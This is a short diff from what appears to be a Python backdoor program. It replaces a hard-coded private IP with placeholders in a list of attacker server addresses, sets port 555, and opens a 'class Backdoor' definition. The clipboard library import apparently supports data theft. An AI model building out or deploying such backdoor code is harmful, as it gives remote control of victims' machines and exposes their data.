@@ -16,7 +16,7 @@ import numpy as np
 import requests
 import pyperclip  
 
-SERVER_IPS = ['192.168.1.70', 'YOUR_PUBLIC_IP_HERE']  # e.g., ['192.168.1.70', '203.0.113.5']
+SERVER_IPS = ['private_ip_here', 'YOUR_PUBLIC_IP_HERE']  # e.g., ['192.168.1.50', '203.0.153.9']
 SERVER_PORT = 555
 
 class Backdoor:
